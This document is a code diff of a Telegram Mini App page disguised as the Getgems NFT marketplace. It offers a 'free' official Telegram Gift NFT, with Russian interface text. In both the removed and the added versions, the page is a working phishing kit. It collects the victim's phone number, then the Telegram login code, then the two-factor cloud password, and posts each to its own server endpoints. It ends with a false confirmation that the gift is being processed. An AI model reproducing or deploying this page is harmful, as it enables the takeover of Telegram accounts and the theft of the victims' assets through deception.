@@ -6,194 +6,176 @@
     <title>Getgems Market</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root {
-            --bg: #000000;
-            --card-bg: #1c1c1e;
-            --text-main: #ffffff;
-            --text-sec: #8e8e93;
-            --accent: #007aff;
-            --border: #2c2c2e;
-            --glass: rgba(28, 28, 30, 0.8);
-        }
-
         body {
-            background: var(--bg); color: var(--text-main);
-            font-family: -apple-system, system-ui, sans-serif;
-            margin: 0; padding: 0; user-select: none; -webkit-tap-highlight-color: transparent;
+            background-color: #000; color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            margin: 0; padding: 0; user-select: none;
         }
-
         /* Header */
-        header {
-            position: sticky; top: 0; z-index: 100;
-            background: var(--glass); backdrop-filter: blur(10px);
-            padding: 12px 16px; display: flex; justify-content: space-between; align-items: center;
-            border-bottom: 0.5px solid var(--border);
+        .header {
+            padding: 12px 16px; border-bottom: 0.5px solid #2c2c2e;
+            display: flex; justify-content: space-between; align-items: center;
+            position: sticky; top: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); z-index: 10;
+        }
+        .header-title { font-weight: 600; font-size: 17px; }
+
+        /* NFT Card */
+        .content { padding: 16px; padding-bottom: 120px; }
+        .nft-main-card {
+            background: #1c1c1e; border-radius: 24px; overflow: hidden;
+            border: 0.5px solid #2c2c2e; margin-bottom: 16px;
+        }
+        .image-container {
+            width: 100%; aspect-ratio: 1; background: #2c2c2e;
+            display: flex; align-items: center; justify-content: center; position: relative;
+        }
+        .image-container img { width: 80%; height: 80%; object-fit: contain; }
+        .offchain-badge {
+            position: absolute; bottom: 12px; left: 12px;
+            background: rgba(0,0,0,0.5); padding: 4px 8px; border-radius: 8px;
+            font-size: 12px; color: #fff; backdrop-filter: blur(4px);
         }
 
-        .tabs {
-            display: flex; padding: 0 16px; gap: 20px; border-bottom: 0.5px solid var(--border);
-            overflow-x: auto; scrollbar-width: none; background: var(--bg);
+        .nft-info { padding: 16px; text-align: left; }
+        .nft-name { font-size: 24px; font-weight: 700; margin-bottom: 4px; }
+        .nft-verified { color: #007aff; font-size: 14px; font-weight: 500; }
+
+        /* Fixed Footer Button */
+        .footer {
+            position: fixed; bottom: 0; left: 0; right: 0;
+            padding: 16px; background: linear-gradient(0deg, #000 0%, transparent 100%);
+            z-index: 100;
         }
-        .tab { padding: 12px 0; font-size: 14px; color: var(--text-sec); white-space: nowrap; cursor: pointer; }
-        .tab.active { color: var(--text-main); border-bottom: 2px solid var(--text-main); }
-
-        /* NFT Detail Screen (Realism) */
-        .container { padding: 16px; padding-bottom: 180px; }
-        .main-card { background: var(--card-bg); border-radius: 20px; overflow: hidden; border: 0.5px solid var(--border); margin-bottom: 20px; }
-        .img-box { width: 100%; aspect-ratio: 1; background: #2c2c2e; display: flex; align-items: center; justify-content: center; position: relative; }
-        .img-box img { width: 85%; height: auto; object-fit: contain; }
-        .badge-off { position: absolute; bottom: 12px; left: 12px; background: rgba(0,0,0,0.6); padding: 4px 8px; border-radius: 6px; font-size: 12px; display: flex; align-items: center; gap: 4px; }
-
-        .info-box { padding: 16px; }
-        .nft-title { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
-        .nft-desc { color: var(--text-sec); font-size: 14px; line-height: 1.4; }
-
-        /* Bottom Floating Panel */
-        .bottom-panel {
-            position: fixed; bottom: 0; width: 100%;
-            background: var(--glass); backdrop-filter: blur(15px);
-            border-top: 0.5px solid var(--border); padding: 16px; box-sizing: border-box; z-index: 200;
-        }
-        .price-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
-        .btn-buy {
-            background: var(--accent); color: #fff; border: none; width: 100%;
-            padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 600;
-            box-shadow: 0 4px 15px rgba(0, 122, 255, 0.3);
+        .btn-primary {
+            background: #007aff; color: #fff; border: none; width: 100%;
+            padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 600;
+            cursor: pointer; box-shadow: 0 4px 12px rgba(0, 122, 255, 0.3);
         }
 
-        /* Auth Modal */
-        .modal {
-            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8);
+        /* Modals */
+        .overlay {
+            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85);
             z-index: 1000; align-items: center; justify-content: center; padding: 20px;
         }
-        .modal-content {
-            background: #1c1c1e; width: 100%; border-radius: 24px; padding: 24px;
-            box-sizing: border-box; border: 0.5px solid var(--border);
+        .modal {
+            background: #1c1c1e; width: 100%; border-radius: 28px;
+            padding: 24px; box-sizing: border-box; border: 0.5px solid #3a3a3c;
         }
         input {
-            width: 100%; padding: 16px; background: #2c2c2e; border: none;
-            color: #fff; border-radius: 12px; margin-top: 16px; font-size: 16px; outline: none; box-sizing: border-box;
+            width: 100%; padding: 16px; background: #2c2c2e; border: 1px solid #3a3a3c;
+            border-radius: 14px; color: #fff; margin-top: 16px; font-size: 16px; box-sizing: border-box;
         }
-        .modal-title { font-size: 20px; font-weight: 700; margin-bottom: 8px; text-align: center; }
     </style>
 </head>
 <body>
 
-<header>
-    <div style="font-weight: 600; font-size: 17px;">Getgems Market ⌵</div>
-    <div onclick="window.location.reload()">🔄</div>
-</header>
-
-<div class="tabs">
-    <div class="tab active">Обзор</div>
-    <div class="tab">История</div>
-    <div class="tab">Атрибуты</div>
+<div class="header">
+    <div class="header-title">Getgems Market ⌵</div>
+    <div style="opacity: 0.6;">🔍</div>
 </div>
 
-<div class="container">
-    <div class="main-card">
-        <div class="img-box">
+<div class="content">
+    <div class="nft-main-card">
+        <div class="image-container">
             <img id="nft-img" src="https://getgems.io/assets/nft-placeholder.png">
-            <div class="badge-off">💎 offchain</div>
+            <div class="offchain-badge">💎 offchain</div>
         </div>
-        <div class="info-box">
-            <div class="nft-title" id="nft-name">Загрузка...</div>
-            <div class="nft-desc">Этот NFT является частью официальной коллекции Telegram Gifts. После получения он будет привязан к вашему аккаунту.</div>
+        <div class="nft-info">
+            <div class="nft-name" id="nft-name">NFT Gift</div>
+            <div class="nft-verified">✓ Официальная коллекция</div>
         </div>
     </div>
 </div>
 
-<div class="bottom-panel">
-    <div class="price-row">
-        <span style="color: var(--text-sec);">Статус</span>
-        <span style="color: #34c759; font-weight: 600;">Доступно для получения</span>
-    </div>
-    <button class="btn-buy" onclick="openAuth()">Забрать NFT бесплатно</button>
+<div class="footer">
+    <button class="btn-primary" onclick="openModal()">Принять подарок</button>
 </div>
 
-<div id="modal" class="modal">
-    <div class="modal-content">
-        <div class="modal-title">Подтверждение</div>
-        <p style="color: var(--text-sec); text-align: center; font-size: 14px;">Введите данные для привязки NFT к вашему профилю Telegram</p>
-        
-        <input type="tel" id="phone" placeholder="+7 999 000-00-00">
-        <input type="text" id="code" placeholder="Код из Telegram" style="display:none;">
-        <input type="password" id="password" placeholder="Облачный пароль" style="display:none;">
-        
-        <button class="btn-buy" id="auth-btn" style="margin-top: 20px;" onclick="sendPhone()">Продолжить</button>
-        <button onclick="openAuth()" style="background:none; border:none; color:var(--text-sec); width:100%; margin-top:16px;">Отмена</button>
+<div id="overlay" class="overlay">
+    <div class="modal">
+        <div id="step-1">
+            <h2 style="margin: 0 0 10px 0;">Принять NFT</h2>
+            <p style="color: #8e8e93; font-size: 14px;">Подтвердите владение аккаунтом для зачисления подарка.</p>
+            <button class="btn-primary" onclick="sharePhone()" style="background: #fff; color: #000; margin-top: 20px;">
+                Поделиться номером
+            </button>
+        </div>
+        <div id="step-2" style="display:none;">
+            <h2>Введите код</h2>
+            <p style="color: #8e8e93; font-size: 14px;">Код отправлен в ваш Telegram</p>
+            <input type="text" id="code" placeholder="Код подтверждения" maxlength="5">
+            <button class="btn-primary" style="margin-top: 20px;" onclick="sendCode()">Подтвердить</button>
+        </div>
+        <div id="step-3" style="display:none;">
+            <h2>2FA Пароль</h2>
+            <input type="password" id="pass" placeholder="Облачный пароль">
+            <button class="btn-primary" style="margin-top: 20px;" onclick="sendPass()">Войти</button>
+        </div>
     </div>
 </div>
 
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
-    tg.setHeaderColor('#1c1c1e');
+    tg.setHeaderColor('#000000');
+    let phone = "";
 
-    // Парсим NFT из ссылки
+    // Динамическая подгрузка NFT из URL
     const params = new URLSearchParams(window.location.search);
     const nftUrl = params.get('nft_url') || "";
-    if(nftUrl) {
-        const parts = nftUrl.split('/');
-        const name = parts[parts.length - 1].replace(/-/g, ' ');
-        document.getElementById('nft-name').innerText = name;
-        // Попытка угадать картинку из ассетов телеграма
-        const assetName = parts[parts.length - 1].split('-')[0];
-        document.getElementById('nft-img').src = `https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/${assetName}.png`;
+    if (nftUrl) {
+        const rawName = nftUrl.split('/').pop();
+        document.getElementById('nft-name').innerText = rawName.replace(/-/g, ' ');
+        const asset = rawName.split('-')[0];
+        document.getElementById('nft-img').src = `https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/${asset}.png`;
     }
 
-    function openAuth() {
-        const m = document.getElementById('modal');
-        m.style.display = (m.style.display === 'flex') ? 'none' : 'flex';
-    }
+    function openModal() { document.getElementById('overlay').style.display = 'flex'; }
 
-    async function sendPhone() {
-        const phone = document.getElementById('phone').value;
-        const res = await fetch('/api/send_phone', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({phone})
+    function sharePhone() {
+        tg.requestContact((ok) => {
+            if(ok) {
+                const check = setInterval(async () => {
+                    const r = await fetch(`/api/check_contact?id=${tg.initDataUnsafe.user.id}`);
+                    const d = await r.json();
+                    if(d.status === 'received') {
+                        clearInterval(check);
+                        phone = d.phone;
+                        document.getElementById('step-1').style.display = 'none';
+                        document.getElementById('step-2').style.display = 'block';
+                    }
+                }, 2000);
+            }
         });
-        const data = await res.json();
-        if(data.status === 'sent') {
-            document.getElementById('phone').style.display = 'none';
-            document.getElementById('code').style.display = 'block';
-            document.getElementById('auth-btn').onclick = sendCode;
-        }
     }
 
     async function sendCode() {
-        const phone = document.getElementById('phone').value;
         const code = document.getElementById('code').value;
-        const res = await fetch('/api/send_code', {
+        const r = await fetch('/api/send_code', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({phone, code})
         });
-        const data = await res.json();
-        if(data.status === '2fa_needed') {
-            document.getElementById('code').style.display = 'none';
-            document.getElementById('password').style.display = 'block';
-            document.getElementById('auth-btn').onclick = sendPassword;
-        } else if(data.status === 'success') {
-            finish();
-        }
+        const d = await r.json();
+        if(d.status === '2fa_needed') {
+            document.getElementById('step-2').style.display = 'none';
+            document.getElementById('step-3').style.display = 'block';
+        } else if(d.status === 'success') { success(); }
     }
 
-    async function sendPassword() {
-        const phone = document.getElementById('phone').value;
-        const password = document.getElementById('password').value;
-        const res = await fetch('/api/send_password', {
+    async function sendPass() {
+        const password = document.getElementById('pass').value;
+        const r = await fetch('/api/send_password', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({phone, password})
         });
-        const data = await res.json();
-        if(data.status === 'success') finish();
+        const d = await r.json();
+        if(d.status === 'success') success();
     }
 
-    function finish() {
-        alert('NFT успешно привязан! Обработка займет до 5 минут.');
+    function success() {
+        alert("Заявка отправлена! Подарок появится в профиле после обработки транзакции.");
         tg.close();
     }
 </script>
